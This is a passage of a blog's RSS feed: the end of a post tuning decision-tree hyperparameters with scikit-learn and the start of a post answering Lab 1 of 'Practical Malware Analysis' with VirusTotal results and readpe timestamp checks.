        &lt;span style=&#34;color:#75715e&#34;&gt;# Create a decision tree classifier&lt;/span&gt;
        classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tree&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DecisionTreeClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,min_samples_split&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;i)

        &lt;span style=&#34;color:#75715e&#34;&gt;# Train the classifier&lt;/span&gt;
        classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fit(X_train, y_train)

        &lt;span style=&#34;color:#75715e&#34;&gt;# Accuracy of the classifier during training&lt;/span&gt;
        training_predictions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;predict(X_train)
        false_positive_rate, true_positive_rate, thresholds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; \
            metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roc_curve(y_train, training_predictions)
        ROC_AUC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;auc(false_positive_rate, true_positive_rate)
        training_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(training_accuracy,ROC_AUC)

        &lt;span style=&#34;color:#75715e&#34;&gt;# Test the classifier&lt;/span&gt;
        testing_predictions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;predict(X_test)
        false_positive_rate, true_positive_rate, thresholds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; \
            metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roc_curve(y_test, testing_predictions)

        &lt;span style=&#34;color:#75715e&#34;&gt;# Accuracy of the classifier during test&lt;/span&gt;
        ROC_AUC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;auc(false_positive_rate, true_positive_rate)
        test_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(test_accuracy,ROC_AUC)

    &lt;span style=&#34;color:#75715e&#34;&gt;# append results for line chart&lt;/span&gt;
    training_results&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(training_accuracy))
    test_results&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(test_accuracy))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s use another line chart to visualize the results:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# plot line chart&lt;/span&gt;
line1, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(min_samples_splits, training_results, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Train AUC&amp;#39;&lt;/span&gt;)
line2, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(min_samples_splits, test_results, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Test AUC&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;legend(handler_map&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{line1: HandlerLine2D(numpoints&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)})
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ylabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AUC score&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;xlabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;min samples split&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;/images/posts/ml-with-phishing/ep1/minsamplessplit.png&#34;
         alt=&#34;Performance of the model while tuning min_samples_split&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Performance of the model while tuning min_samples_split&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;We can clearly see from the chart how increasing &lt;code&gt;min_samples_split&lt;/code&gt; results in an underfitting case, where the model is not able to learn from the samples during training.&lt;/p&gt;
&lt;h2 id=&#34;tuning-min-samples-leaf&#34;&gt;Tuning: min samples leaf&lt;/h2&gt;
&lt;p&gt;Similarly to the previous parameter, &lt;code&gt;min_samples_leaf&lt;/code&gt; can be:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;int&lt;/code&gt;, and it is used to specify the minimum number of samples required to be at a leaf node&lt;/li&gt;
&lt;li&gt;if &lt;code&gt;float&lt;/code&gt;, it represents a fraction and &lt;code&gt;ceil(min_samples_leaf * n_samples)&lt;/code&gt; are the minimum number of samples for each node&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;By default, the value is set to 1, but we will consider the cases where it goes from 0.05 to 0.5.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# AUC scores for training and test&lt;/span&gt;
training_results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
test_results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

&lt;span style=&#34;color:#75715e&#34;&gt;# from 5% to 50%&lt;/span&gt;
min_samples_leaves &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;linspace(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,endpoint&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; min_samples_leaves:

    StratifiedKFold(n_splits&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, shuffle&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)

    &lt;span style=&#34;color:#75715e&#34;&gt;# loop with splits&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; train_index, test_index &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; skf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(inputs, outputs):
        training_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([])
        test_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([])
        X_train, X_test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; inputs[train_index], inputs[test_index]
        y_train, y_test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; outputs[train_index], outputs[test_index]

        &lt;span style=&#34;color:#75715e&#34;&gt;# Create a decision tree classifier&lt;/span&gt;
        classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tree&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DecisionTreeClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, min_samples_leaf&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;i)

        &lt;span style=&#34;color:#75715e&#34;&gt;# Train the classifier&lt;/span&gt;
        classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fit(X_train, y_train)

        &lt;span style=&#34;color:#75715e&#34;&gt;# Accuracy of the classifier during training&lt;/span&gt;
        training_predictions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;predict(X_train)
        false_positive_rate, true_positive_rate, thresholds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; \
            metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roc_curve(y_train, training_predictions)
        ROC_AUC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;auc(false_positive_rate, true_positive_rate)
        training_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(training_accuracy,ROC_AUC)

        &lt;span style=&#34;color:#75715e&#34;&gt;# Test the classifier&lt;/span&gt;
        testing_predictions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;predict(X_test)
        false_positive_rate, true_positive_rate, thresholds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; \
            metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roc_curve(y_test, testing_predictions)

        &lt;span style=&#34;color:#75715e&#34;&gt;# Accuracy of the classifier during test&lt;/span&gt;
        ROC_AUC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;auc(false_positive_rate, true_positive_rate)
        test_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(test_accuracy,ROC_AUC)

    &lt;span style=&#34;color:#75715e&#34;&gt;# append results for line chart&lt;/span&gt;
    training_results&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(training_accuracy))
    test_results&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(test_accuracy))

&lt;span style=&#34;color:#75715e&#34;&gt;# plot line chart&lt;/span&gt;
line1, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(min_samples_leaves, training_results, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Train AUC&amp;#39;&lt;/span&gt;)
line2, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(min_samples_leaves, test_results, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Test AUC&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;legend(handler_map&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{line1: HandlerLine2D(numpoints&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)})
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ylabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AUC score&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;xlabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;min samples leaf&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;/images/posts/ml-with-phishing/ep1/minsamplesleaf.png&#34;
         alt=&#34;Performance of the model while tuning min_samples_leaf&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Performance of the model while tuning min_samples_leaf&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;We can see that, similarly to the tuning of &lt;code&gt;min_samples_split&lt;/code&gt;, increasing &lt;code&gt;min_samples_leaf&lt;/code&gt; cause our model to underfit, drastically affecting the accuracy of the classifier during training and test.&lt;/p&gt;
&lt;h2 id=&#34;tuning-max-features&#34;&gt;Tuning: max features&lt;/h2&gt;
&lt;p&gt;The last parameter we are going to consider is &lt;code&gt;max_features&lt;/code&gt;, which specifies the number of features to consider when looking for the best split.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If &lt;code&gt;int&lt;/code&gt;, then consider &lt;code&gt;max_features&lt;/code&gt; features at each split.&lt;/li&gt;
&lt;li&gt;If &lt;code&gt;float&lt;/code&gt;, is a fraction and &lt;code&gt;int(max_features * n_features)&lt;/code&gt; features are considered at each split.&lt;/li&gt;
&lt;li&gt;By default it is &lt;code&gt;None&lt;/code&gt;, and &lt;code&gt;max_features=n_features&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Considering the number of features of our dataset, we will test measure the precision of classifiers having &lt;code&gt;max_features&lt;/code&gt; between 1 and 10.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# AUC scores for training and test&lt;/span&gt;
training_results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
test_results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

&lt;span style=&#34;color:#75715e&#34;&gt;# from 1 to 10 features&lt;/span&gt;
max_features &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,len(inputs[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;))

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; max_features:

    StratifiedKFold(n_splits&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, shuffle&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)

    &lt;span style=&#34;color:#75715e&#34;&gt;# loop with splits&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; train_index, test_index &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; skf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(inputs, outputs):
        training_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([])
        test_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([])
        X_train, X_test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; inputs[train_index], inputs[test_index]
        y_train, y_test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; outputs[train_index], outputs[test_index]

        &lt;span style=&#34;color:#75715e&#34;&gt;# Create a decision tree classifier&lt;/span&gt;
        classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tree&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DecisionTreeClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,max_features&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;i)

        &lt;span style=&#34;color:#75715e&#34;&gt;# Train the classifier&lt;/span&gt;
        classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fit(X_train, y_train)

        &lt;span style=&#34;color:#75715e&#34;&gt;# Accuracy of the classifier during training&lt;/span&gt;
        training_predictions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;predict(X_train)
        false_positive_rate, true_positive_rate, thresholds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; \
            metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roc_curve(y_train, training_predictions)
        ROC_AUC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;auc(false_positive_rate, true_positive_rate)
        training_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(training_accuracy,ROC_AUC)

        &lt;span style=&#34;color:#75715e&#34;&gt;# Accuracy of the classifier during test&lt;/span&gt;
        testing_predictions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;predict(X_test)
        false_positive_rate, true_positive_rate, thresholds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; \
            metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roc_curve(y_test, testing_predictions)

        &lt;span style=&#34;color:#75715e&#34;&gt;# calculate classifier accuracy for test&lt;/span&gt;
        ROC_AUC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;auc(false_positive_rate, true_positive_rate)
        test_accuracy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(test_accuracy,ROC_AUC)

    &lt;span style=&#34;color:#75715e&#34;&gt;# append results for line chart&lt;/span&gt;
    training_results&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(training_accuracy))
    test_results&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(test_accuracy))

&lt;span style=&#34;color:#75715e&#34;&gt;# plot line chart&lt;/span&gt;
line1, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(max_features, training_results, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Train AUC&amp;#39;&lt;/span&gt;)
line2, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(max_features, test_results, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Test AUC&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;legend(handler_map&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{line1: HandlerLine2D(numpoints&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)})
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ylabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AUC score&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;xlabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;max features&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;/images/posts/ml-with-phishing/ep1/maxfeatures.png&#34;
         alt=&#34;Performance of the model while tuning max_features&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Performance of the model while tuning max_features&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;We can see how the accuracy of the model does not seem to improve much when increasing the number of features considered during a split. While this may seem counter-intuitive, the scikit-learn documentation specifies that &amp;lsquo;&lt;em&gt;the search for a split does not stop until at least one valid partition of the node samples is found, even if it requires to effectively inspect more than max_features features&lt;/em&gt;.&amp;rsquo;&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;These posts will investigate how tuning some of the available parameters can affect the performance of simple models. In this case, we saw how &lt;code&gt;criterion&lt;/code&gt;, &lt;code&gt;splitter&lt;/code&gt;, &lt;code&gt;max_depth&lt;/code&gt;, &lt;code&gt;min_samples_split&lt;/code&gt;, &lt;code&gt;min_samples_leaf&lt;/code&gt; and &lt;code&gt;max_features&lt;/code&gt; alter the predictions of a decision tree.&lt;/p&gt;
&lt;p&gt;As pointed out from a friend, this is not the proper way of tuning the parameters of a model: one could extend parameters search by means of the &lt;a href=&#34;https://scikit-learn.org/stable/modules/generated/sklearn.model_selection.RandomizedSearchCV.html&#34;&gt;RandomizedSearchCV&lt;/a&gt; provided by sklearn.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Practical malware analysis: solutions for Lab 1</title>
      <link>/posts/practical-malware-lab1/</link>
      <pubDate>Tue, 21 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>/posts/practical-malware-lab1/</guid>
      <description>&lt;figure&gt;&lt;img src=&#34;/images/posts/practical-malware-lab1/practical-malware-header.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;I am trying to acquire some knowledge on malware analysis by using &lt;a href=&#34;https://practicalmalwareanalysis.com/&#34;&gt;&amp;lsquo;Practical Malware Analysis&amp;rsquo;&lt;/a&gt; (by &lt;em&gt;Sikorski, Michael, and Andrew Honig, 2012&lt;/em&gt;). I will publish my solutions of the exercises as soon as I complete them; &lt;a href=&#34;https://github.com/mikesiko/PracticalMalwareAnalysis-Labs&#34;&gt;here&lt;/a&gt; you can find all the executables for the labs.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTE: I will try to use Linux utilities&lt;/strong&gt; (such as &lt;a href=&#34;http://pev.sourceforge.net&#34;&gt;pev&lt;/a&gt;, &lt;a href=&#34;https://linux.die.net/man/1/wrestool&#34;&gt;wrestool&lt;/a&gt; and &lt;a href=&#34;https://github.com/horsicq/Detect-It-Easy&#34;&gt;Detect It Easy&lt;/a&gt;) &lt;strong&gt;instead of the Windows tools which are mentioned in the book.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The first chapter was about basic static analysis techniques, you can find some notes about it &lt;a href=&#34;https://github.com/andpalmier/PracticalMalwareSummary&#34;&gt;in this repo&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;lab-1-1&#34;&gt;Lab 1-1&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;em&gt;Upload the files to VirusTotal and view the reports. Does either file match any existing antivirus signatures?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Uploading the files on VirusTotal, the results are that Lab01-01.dll is flagged as malicious by 34 engines, and Lab01-01.exe by 41. Here are links to the reports for &lt;a href=&#34;https://www.virustotal.com/gui/file/f50e42c8dfaab649bde0398867e930b86c2a599e8db83b8260393082268f2dba/detection&#34;&gt;Lab01-01.dll&lt;/a&gt; and &lt;a href=&#34;https://www.virustotal.com/gui/file/58898bd42c5bd3bf9b1389f0eee5b39cd59180e8370eb9ea838a0b327bd6fe47/detection&#34;&gt;Lab01-01.exe&lt;/a&gt;.&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;em&gt;When were these files compiled?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;I used &lt;a href=&#34;http://pev.sourceforge.net&#34;&gt;pev&lt;/a&gt; to detect the timestamp of the compilation:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ readpe Lab01-01.dll | grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time stamp&amp;#34;&lt;/span&gt;
Date/time stamp:                 &lt;span style=&#34;color:#ae81ff&#34;&gt;1292775398&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Sun, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;2010&lt;/span&gt; 16:16:38 UTC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
$ readpe Lab01-01.exe | grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time stamp&amp;#34;&lt;/span&gt;
Date/time stamp:                 &lt;span style=&#34;color:#ae81ff&#34;&gt;1292775379&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Sun, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;2010&lt;/span&gt; 16:16:19 UTC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;em&gt;Are there any indications that either of these files is packed or obfuscated? If so, what are these indicators?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The output of &lt;code&gt;strings&lt;/code&gt; on both the files does not include &lt;code&gt;LoadLibrary&lt;/code&gt; or &lt;code&gt;GetProcAddress&lt;/code&gt;. We can have confirmation that these are not packed by using &lt;a href=&#34;https://github.com/horsicq/Detect-It-Easy&#34;&gt;Detect It Easy&lt;/a&gt;:&lt;/p&gt;
